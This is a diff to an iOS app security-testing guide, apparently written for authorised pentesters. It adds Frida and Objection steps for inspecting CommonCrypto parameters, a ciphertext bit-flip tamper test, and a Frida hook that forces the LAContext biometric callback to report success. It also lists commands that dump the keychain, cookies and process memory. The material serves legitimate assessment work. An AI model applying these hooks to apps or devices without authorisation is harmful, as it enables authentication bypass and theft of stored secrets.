@@ -4,11 +4,18 @@
 
 ## Objection Session
 
-* <pre class="language-bash" data-line-numbers><code class="lang-bash">frida-ps -Uai
+* **On the Mac:** check the host version, then list installed/running apps. Use the resulting process name for attach and bundle identifier for spawn; start the app if it is not running.
+* <pre class="language-bash" data-line-numbers><code class="lang-bash">frida --version
+  python -m pip show frida frida-tools objection
+  frida-ps -Uai
   frida -U -n &#x3C;app-process-name>
   frida-trace -U -m '*[NSURLRequest *]' &#x3C;app-process-name>
   objection --name &#x3C;app-process-name> start
   </code></pre>
+* **Attach and load one of the Frida scripts below:** put the selected script in the specified host file, then trigger its target app flow.
+  * ```bash
+    frida -U -n '<app-process-name>' -l '<hook.js>'
+    ```
 * Objective-C selectors: `-` instance method, `+` class method.
 * Find identifiers: `frida-ps -Uai | grep '<app-name-fragment>'`.
 * Attach by process name; spawn by bundle ID. Gadget may expose a different target name.
@@ -45,7 +52,6 @@
   ios plist cat Info.plist
   ios plist cat &#x3C;app-bundle-path>/Info.plist
   ios keychain dump
-  ios monitor crypto
   ios info binary
   ios cookies get
   memory dump all &#x3C;output-file>.dmp
@@ -56,9 +62,96 @@
     filesystem download <path-to-file>
     sqlite connect <database-file>
     ```
-* `ios monitor crypto` monitors supported CommonCrypto calls, not all cryptography. [Command registry](https://github.com/sensepost/objection/blob/master/objection/console/commands.py).
 * Detection Bypass: Hestia, Shadow, Objection.
 * Alternatives: [RMS](https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security), [Grapefruit](https://github.com/ChiChou/grapefruit).
+
+## Cryptographic Parameters and Tampering
+
+* **Objection quick view:** run `ios monitor crypto`, trigger two encryptions of different test markers, and correlate the calls with the stored/transmitted field. It covers supported CommonCrypto functions, not all CryptoKit/Swift/native implementations.
+* **Frida CLI:** load this script through the session workflow above. It observes one-shot `CCCrypt` and `CCKeyDerivationPBKDF`; it does not cover streaming `CCCryptor*` or CryptoKit. Key/salt fingerprints identify repeated inputs without printing raw keys/passwords.
+  * ```javascript
+    const hex = address => Array.from(new Uint8Array(address.readByteArray(32)),
+      value => value.toString(16).padStart(2, '0')).join('');
+    const digestAddress = Module.findGlobalExportByName('CC_SHA256');
+    if (digestAddress === null) throw new Error('CC_SHA256 not loaded');
+    const sha256 = new NativeFunction(digestAddress, 'pointer', ['pointer', 'uint', 'pointer']);
+    const fingerprint = (address, length) => {
+      if (address.isNull() || length === 0) return null;
+      const output = Memory.alloc(32);
+      sha256(address, length, output);
+      return hex(output);
+    };
+    const crypt = Module.findGlobalExportByName('CCCrypt');
+    if (crypt !== null) Interceptor.attach(crypt, {
+      onEnter(args) {
+        const algorithm = args[1].toInt32();
+        const options = args[2].toInt32();
+        this.record = { api: 'CCCrypt', operation: args[0].toInt32(), algorithm: algorithm,
+          options: options, keyBytes: args[4].toUInt32(), inputBytes: args[7].toUInt32(),
+          keyHash: fingerprint(args[3], args[4].toUInt32()) };
+        if (algorithm === 0 && (options & 2) === 0) {
+          this.record.aesCbcIv = args[5].isNull() ? 'zero IV (implicit)'
+            : Array.from(new Uint8Array(args[5].readByteArray(16)),
+              value => value.toString(16).padStart(2, '0')).join('');
+        }
+      },
+      onLeave(result) {
+        this.record.status = result.toInt32();
+        console.log(JSON.stringify(this.record));
+      }
+    });
+    const derive = Module.findGlobalExportByName('CCKeyDerivationPBKDF');
+    if (derive !== null) Interceptor.attach(derive, {
+      onEnter(args) {
+        this.record = { api: 'CCKeyDerivationPBKDF', algorithm: args[0].toInt32(),
+          saltBytes: args[4].toUInt32(), saltHash: fingerprint(args[3], args[4].toUInt32()),
+          prf: args[5].toInt32(), rounds: args[6].toUInt32(), keyBytes: args[8].toUInt32() };
+      },
+      onLeave(result) {
+        this.record.status = result.toInt32();
+        console.log(JSON.stringify(this.record));
+      }
+    });
+    ```
+* **Interpret:** `CCCrypt` operation `0` encrypts, `1` decrypts; algorithm `0` is AES. Options bit `2` means ECB; without it the one-shot AES API uses CBC, and a null IV means zero bytes. Compare successful encryption calls only; repeated decryption naturally reuses the saved IV. PKCS#7 padding is options bit `1`, not authentication.
+* **KDF test:** create two independent records/accounts with the same test password. Compare salt hashes, PRF, rounds and output length; then repeat with a different password. Equal per-record salts indicate reuse, but iteration adequacy needs the actual algorithm, offline exposure and current password-KDF guidance. A SHA-256 key fingerprint changing does not establish a strong derivation.
+* **Ciphertext mutation, Node.js REPL on macOS:** select an offset inside the ciphertext portion of the actual Base64 envelope, not its IV/version/tag header; send/store the changed field through the same flow.
+  * ```javascript
+    const encrypted = Buffer.from('REPLACE_BASE64_CIPHERTEXT', 'base64');
+    const offset = 0;
+    encrypted[offset] ^= 1;
+    console.log(encrypted.toString('base64'));
+    ```
+* **Confirm:** the changed ciphertext is accepted as authentic and alters a protected value/action. A failed MAC/tag, padding error or rejected parser input is not accepted tampering. Correlate a hardcoded/weakly derived key with this actual consumer rather than reporting every crypto call.
+
+## Biometric Callback and Protected Operation
+
+* **Baseline:** trigger the feature and compare success, Cancel, failed biometrics and passcode fallback. Identify whether the app calls `evaluatePolicy` or an access-control/key operation. Policy `1` is biometrics; policy `2` permits device-owner authentication including passcode fallback.
+* **Frida script:** initially observe only. Set `globalThis.forceBiometricSuccess = true` in the same Frida REPL and cancel the next prompt to test a client callback that trusts a success Boolean. No private key or authentication context is granted by this override.
+  * ```javascript
+    globalThis.forceBiometricSuccess = false;
+    const pendingReplies = new Set();
+    const evaluate = ObjC.classes.LAContext['- evaluatePolicy:localizedReason:reply:'];
+    if (!evaluate) throw new Error('evaluatePolicy unavailable; inspect actual authentication path');
+    Interceptor.attach(evaluate.implementation, {
+      onEnter(args) {
+        const policy = args[2].toInt32();
+        const reply = new ObjC.Block(args[4]);
+        const original = reply.implementation;
+        pendingReplies.add(reply);
+        reply.implementation = function (success, error) {
+          console.log('policy=' + policy + '; actualSuccess=' + success +
+            '; override=' + globalThis.forceBiometricSuccess);
+          try {
+            return original(globalThis.forceBiometricSuccess ? true : success,
+              globalThis.forceBiometricSuccess ? ptr(0) : error);
+          } finally { pendingReplies.delete(reply); }
+        };
+      }
+    });
+    ```
+* **Confirm:** after the forced callback, perform the same protected export/read/payment/signing operation. A screen transition alone is only a UI-gate bypass. If Keychain/SEP use still requires authentication, record that enforced boundary rather than claiming hardware-key bypass.
+* **Key-bound flow:** `evaluateAccessControl`/`SecKey`/Keychain ACL paths may not invoke this selector. Use the [no-prompt Keychain test](data-storage-and-privacy.md#keychain-query-one-item-without-a-prompt), inspect the actual key access-control flags, and compare the real signing/decryption result after cancellation/expiry. Repeat enrollment/fallback changes only against the item's configured policy.
 
 ### Optional fridump3 Memory Capture
 
